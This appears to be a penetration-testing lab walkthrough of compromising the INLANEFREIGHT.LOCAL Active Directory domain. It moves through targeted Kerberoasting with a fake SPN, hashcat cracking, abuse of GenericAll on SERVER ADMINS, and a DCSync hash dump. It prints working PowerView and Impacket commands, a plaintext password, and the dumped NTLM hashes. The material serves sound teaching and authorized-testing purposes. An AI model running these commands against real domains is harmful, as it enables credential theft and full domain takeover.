## Active Directory Compromise

### Starting Position

At this point, enumeration and lateral movement across the internal network has produced the following credential pair:

```
mssqladm:DBAilfreight1!
```

[BloodHound](https://github.com/BloodHoundAD/BloodHound) analysis shows that `mssqladm` holds `GenericWrite` over the `ttimmons` user account. This permission allows us to write arbitrary attributes to the object, including the `servicePrincipalName` attribute. Setting a fake SPN on a user account makes that account Kerberoastable. If the account is using a weak password, cracking the resulting TGS ticket will yield another valid credential pair.

## Targeted Kerberoasting via Fake SPN

### Creating a PSCredential Object

Return to the DEV01 machine where [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) is already loaded. Rather than opening a new RDP session, create a `PSCredential` object to run commands in the context of `mssqladm` directly from the existing shell:

```powershell
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

### Setting the Fake SPN

Use `Set-DomainObject` from PowerView to write a fake SPN to the `ttimmons` account. The SPN value `acmetesting/LEGIT` is arbitrary and will be removed after the test. This action must be recorded in the report appendix as a configuration change made during the engagement.

```powershell
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

Verbose output confirms the write succeeded:

```
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons'
```

### Requesting the TGS Ticket

Switch back to the attack host and use [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) from [Impacket](https://github.com/fortra/impacket) with [proxychains](https://github.com/haad/proxychains) to request a TGS ticket for `ttimmons`:

```bash
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

The fake SPN is visible and a TGS hash is returned:

```
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation
--------------------  --------  --------  --------------------------  ---------  ----------
acmetesting/LEGIT     ttimmons            2022-06-01 14:32:18.194423  <never>

$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$6c391145c0c6430a...
<SNIP>
```

### Cracking the Hash

Save the hash to a file and run it through [Hashcat](https://hashcat.net/hashcat/) using mode `13100` (Kerberos 5 TGS-REP etype 23) against the `rockyou.txt` wordlist:

```bash
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

Hashcat cracks the hash in 22 seconds:

```
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10678272/14344385 (74.44%)
Speed.#1.........:   485.7 kH/s (2.50ms) @ Accel:16 Loops:1 Thr:64 Vec:8
```

A second valid credential pair is now confirmed for `ttimmons`.

## Abusing GenericAll on Server Admins

### BloodHound Analysis

Loading the `ttimmons` context into [BloodHound](https://github.com/BloodHoundAD/BloodHound) reveals that this account holds `GenericAll` over the `SERVER ADMINS` group. `GenericAll` grants full control over the object, including the ability to add members. Looking further, `SERVER ADMINS` holds the privileges required to perform a DCSync attack, meaning any member of that group can replicate directory data from the Domain Controller and pull NTLM hashes for any domain user.

### Creating a PSCredential Object for ttimmons

Before modifying group membership, create a `PSCredential` object for `ttimmons`:

```powershell
$timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

### Adding ttimmons to Server Admins

Resolve the group SID and use `Add-DomainGroupMember` from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to add `ttimmons` to the group:

```powershell
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

Verbose output confirms the addition:

```
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622'
```

`ttimmons` now inherits the DCSync privileges held by `SERVER ADMINS`.

## DCSync Attack

With `ttimmons` now a member of `SERVER ADMINS`, use [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) from [Impacket](https://github.com/fortra/impacket) through [proxychains](https://github.com/haad/proxychains) to replicate all NTLM password hashes from the Domain Controller via the DRSUAPI method:

```bash
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

The output returns NTLM hashes for all domain accounts including `Administrator`, `krbtgt`, and domain users:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e55xxxxxxxxxx787ddbb6e6afa2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::
inlanefreight.local\avazquez:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
inlanefreight.local\wdillard:1719:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::
<SNIP>
```

Domain compromise is complete. All steps must be fully documented before proceeding with any further post-exploitation actions.

## Post-Compromise Actions

After documenting every step, a number of high-value actions can follow:

- Dump the entire NTDS database and crack passwords offline to give the client a picture of overall password strength and policy compliance
- Authenticate to the Domain Controller interactively via RDP and run `hostname`, `whoami`, and `ipconfig /all` to produce a clear visual for the report that drives the impact home more effectively than raw secretsdump output
- Enumerate domain and forest trusts if they are in scope and attack any weak trust configurations found
- Test client alerting by creating a new Domain Admin or Enterprise Admin account, or by adding a controlled account into those highly privileged groups

For the alerting test, record the action in the report appendix as a configuration change made during the engagement. If the client detects the addition and removes the account, note this positively in the report. Clients who have automated monitoring and response in place for changes to privileged groups should receive explicit credit, as recognising good security posture builds trust and adds genuine value to the engagement.
